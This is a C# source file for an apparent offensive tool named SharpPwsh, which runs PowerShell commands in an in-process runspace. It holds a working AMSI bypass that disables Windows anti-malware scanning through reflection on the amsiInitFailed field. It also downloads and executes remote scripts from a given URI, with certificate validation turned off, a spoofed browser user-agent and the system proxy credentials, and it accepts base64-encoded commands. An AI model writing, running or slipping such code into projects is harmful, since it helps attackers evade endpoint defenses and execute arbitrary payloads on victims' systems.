using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Text;
using CommandLine;

// need to add as reference:
// c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

namespace SharpPwsh
{
    class Program
    {
        class Options
        {
            [Option('c', "cmd", Required = true, Separator = ',', HelpText = "Powershell command to run")]
            public IEnumerable<string> inputCmds { get; set; }
            [Option('u', "uri", Required = false, Separator = ',', HelpText = "URI to fetch remote script")]
            public  IEnumerable<string> inputUri { get; set; }
            [Option('b', "bypass-amsi", Required = false, HelpText = "Bypass AMSI")]
            public bool bypassAmsi { get; set; }
            [Option('e', "encoded", Required = false, HelpText = "Encodeded command (base64)")]
            public bool encodedCmd { get; set; }
        }
        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                IEnumerable<string> inputCmds = o.inputCmds;
                IEnumerable<string> inputURIs = o.inputUri;
                bool bypassAmsi = o.bypassAmsi;
                bool encodedCmd = o.encodedCmd;
                List<string> cmds = new List<string>();
                
                // bypass amsi
                if (bypassAmsi)
                {
                    // using powershell to avoid p/d invoke
                    cmds.Add("$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}}");
                    cmds.Add("$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}}");
                    cmds.Add("$f.SetValue($null,$true)");
                }

                // fetch remote script and execute
                foreach (string inputURI in inputURIs)
                {
                    string aCmd = FetchURI(inputURI);
                    cmds.Add(aCmd);
                }
                
                // add input commands
                foreach (string cmd in inputCmds)
                {
                    if (encodedCmd)
                    {
                        byte[] d = Convert.FromBase64String(cmd);
                        string n = Encoding.ASCII.GetString(d);
                        // trim null terminators
                        n = n.Replace("\0", string.Empty);
                        cmds.Add(n);
                    }
                    else
                    {
                        cmds.Add(cmd);
                    }
                }
                
                ExecutePwsh(cmds);
            });

            return;
        }
        public static void ExecutePwsh(List<string> cmds)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // instantiate a PowerShell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            foreach (string cmd in cmds)
            {
                if (String.IsNullOrWhiteSpace(cmd))
                {
                    Console.WriteLine("error: command string not supplied");
                    break;
                }
                ps.AddScript(cmd);
                ps.AddCommand("Out-String");
                PSDataCollection<object> results = new PSDataCollection<object>();
                ps.Streams.Error.DataAdded += (sender, e) =>
                {
                    Console.WriteLine("Error");
                    foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                    {
                        results.Add(er);
                    }
                };
                ps.Streams.Verbose.DataAdded += (sender, e) =>
                {
                    foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                    {
                        results.Add(vr);
                    }
                };
                ps.Streams.Debug.DataAdded += (sender, e) =>
                {
                    foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                    {
                        results.Add(dr);
                    }
                };
                ps.Streams.Warning.DataAdded += (sender, e) =>
                {
                    foreach (WarningRecord wr in ps.Streams.Warning)
                    {
                        results.Add(wr);
                    }
                };
                ps.Invoke(null, results);
                string output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                Console.WriteLine(output);
            }

            rs.Close();
        }

        public static string FetchURI(string url)
        {
            try
            {
                // fuck ciphers
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                WebClient client = new WebClient();
                // hood up
                client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
                // yeah yeah
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.Proxy.Credentials = CredentialCache.DefaultCredentials;
                string responseString = client.DownloadString(url);
                //return Convert.FromBase64String(compressedEncodedShellcode);
                return responseString;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
                //var ret = new byte[] { 0xC3 };
                return null;
            }
        }
    }
}
